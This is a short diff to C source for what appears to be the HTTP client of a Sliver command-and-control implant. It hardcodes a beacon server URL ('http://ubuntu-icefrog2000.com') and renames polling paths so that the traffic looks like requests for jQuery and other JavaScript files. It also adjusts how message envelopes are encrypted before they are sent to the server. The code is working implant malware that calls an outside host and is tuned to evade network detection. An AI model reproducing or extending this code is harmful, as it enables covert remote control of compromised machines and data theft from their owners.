@@ -702,7 +702,7 @@ PSLIVER_HTTP_CLIENT HttpInit()
 
 	// Tu dinh config --------------------------------------------------------------------
 	CHAR szUri[] = "http://ubuntu-icefrog2000.com";
-	LPSTR PollPaths[] = { "assets", "bundle" };
+	LPSTR PollPaths[] = { "script", "javascripts", "javascript", "jscript", "js", "umd" };
 	LPSTR PollFiles[] = { "jquery", "route", "app" };
 	LPSTR SessionPaths[] = { "upload", "actions" };
 	LPSTR SessionFiles[] = { "samples", "api" };
@@ -845,7 +845,7 @@ BOOL HttpSend
 	}
 
 	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
-	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope, TRUE);
+	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
 	lpUri = CreateSessionURL(pConfig, pHttpClient);
 	if (lpUri == NULL) {
 		goto CLEANUP;
